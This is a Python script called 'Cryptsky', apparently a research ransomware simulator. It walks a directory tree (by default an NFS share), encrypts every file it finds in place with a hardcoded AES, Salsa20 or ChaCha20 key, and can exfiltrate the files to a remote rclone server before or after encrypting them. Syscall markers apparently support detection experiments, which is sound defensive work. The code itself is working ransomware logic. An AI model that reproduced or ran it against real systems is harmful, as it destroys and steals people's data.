#!/usr/bin/python3
from Crypto.Cipher import AES,Salsa20,ChaCha20
from Crypto.Util import Counter
from Crypto.Util.Padding import pad,unpad
from datetime import datetime
import argparse
import os
import time

import discover
import modify
import exfiltrate
import sysmark

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
#  set to either: '128/192/256 bit plaintext key' or False
HARDCODED_KEY = 'yellow submarine'.encode('utf-8')


def get_parser():
    parser = argparse.ArgumentParser(description='Cryptsky')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    parser.add_argument('-a', '--algo', help='Crypto Algo', default="AES")
    parser.add_argument('-m', '--mode', help='AES mode', default="CTR")
    parser.add_argument('-w', '--write', help='Write method', default="O")
    parser.add_argument('-p', '--path', help='Add the path to encrypt/decrypt',
                        default='/mnt/nfs_shared')
    parser.add_argument('-e', '--exfil', help='Exfiltrate files. 0: No Exfil, 1: After encrypt, 2: Before encrypt', default=0)
    parser.add_argument('-r', '--remote', help='Remote exfil server', default='sftp')
    parser.add_argument('-v', '--verbose', help='Add custom syscalls', default=0)
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']
    algo = args['algo']
    user_mode = args['mode']
    write_mode = args['write']
    exfil = int(args['exfil'])
    remote = args['remote']
    pid = int(args['verbose'])
    try:
        mode = getattr(AES, f"MODE_{user_mode.upper()}")
    except AttributeError:
        raise ValueError(f"Unsupported mode: AES {user_mode}")
    
    if pid > 0:
        sysmark.invoke_syscall(pid,1)

    if decrypt:
        print(f"\Ransomed! Your files have been encrypted. Your decryption key is: {HARDCODED_KEY}")
        key = HARDCODED_KEY
        encrypt_mode = 0
    else:
        # In real ransomware, this part includes complicated key generation,
        # sending the key back to attackers and more
        if HARDCODED_KEY:
            key = HARDCODED_KEY
        encrypt_mode = 1
    

    if algo == 'AES':
        if mode in (AES.MODE_CBC, AES.MODE_CFB, AES.MODE_OFB):
            iv = 'initial_vectors!'.encode('utf-8')
            crypt = AES.new(key, mode, iv=iv)
        elif mode == AES.MODE_CTR:
            ctr = Counter.new(128)
            crypt = AES.new(key, mode, counter=ctr)
        else:
            crypt = AES.new(key, mode)
    elif algo == 'Salsa20':
        nonce = 'nonce_b!'.encode("utf-8")
        crypt = Salsa20.new(key=key, nonce=nonce)
    elif algo == 'ChaCha20':
        nonce = 'nonce_bytes!'.encode("utf-8")
        key256 = key+key
        crypt = ChaCha20.new(key=key256, nonce=nonce)

    # change this to fit your needs.
    if exfil > 0:
        now = datetime.now()
        pathstr = now.strftime("%Y%m%d_%H%M%S")
        if not exfiltrate.is_able():
            print("Rclone is not installed.")
    startdirs = [args['path']]

    #phase_time_start = time.time()
    #sleep = False

    for currentDir in startdirs:
        for f in discover.discoverFiles(currentDir):
            #print(f)
            
            # Swap between idle and active
            #if (time.time() - phase_time_start > 5):
            #    sleep = True

            #if sleep:
            #    time.sleep(5)
            #    sleep = False
            #    phase_time_start = time.time()

            if exfil == 2:
                exfiltrate.copy(f, remote, pathstr)

            if write_mode == 'O':
                modify.modify_file_inplace(f, crypt, encrypt=encrypt_mode)
            elif write_mode == 'WB':
                modify.modify_file_writebefore(f, crypt, encrypt=encrypt_mode)
            elif write_mode == 'WA':
                modify.modify_file_writeafter(f, crypt, encrypt=encrypt_mode)
            #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted

            if exfil == 1:
                if write_mode == 'WB':
                    f = f+'.crypt'
                exfiltrate.copy(f, remote, pathstr)
    if pid > 0:
        sysmark.invoke_syscall(pid,1)

if __name__=="__main__":
    main()
